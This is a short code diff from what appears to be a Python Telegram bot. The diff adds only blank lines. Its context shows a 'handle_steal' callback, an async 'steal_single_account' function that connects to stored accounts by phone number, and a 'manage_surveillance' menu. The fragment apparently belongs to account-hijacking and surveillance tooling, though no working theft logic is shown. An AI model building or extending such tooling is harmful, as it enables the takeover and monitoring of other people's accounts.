@@ -1361,6 +1361,9 @@ def handle_steal(call):
         res = run_async(steal_single_account(int(target), call.from_user.id))
         bot.edit_message_text(res, call.message.chat.id, status_msg.message_id, reply_markup=home_keyboard(call.from_user.id), parse_mode="Markdown")
 
+
+
+
 async def steal_single_account(acc_id, admin_id):
     acc = get_account(acc_id)
     if not acc: return "❌ الحساب غير موجود."
@@ -1398,6 +1401,16 @@ async def steal_single_account(acc_id, admin_id):
     except Exception as e: return f"❌ فشل الاتصال بالحساب `{phone}`."
     finally:
         if client_a.is_connected: await client_a.disconnect()
+
+
+
+
+
+
+
+
+
+
 
 @bot.callback_query_handler(func=lambda call: call.data == "manage_surveillance")
 def manage_surveillance_menu(call):
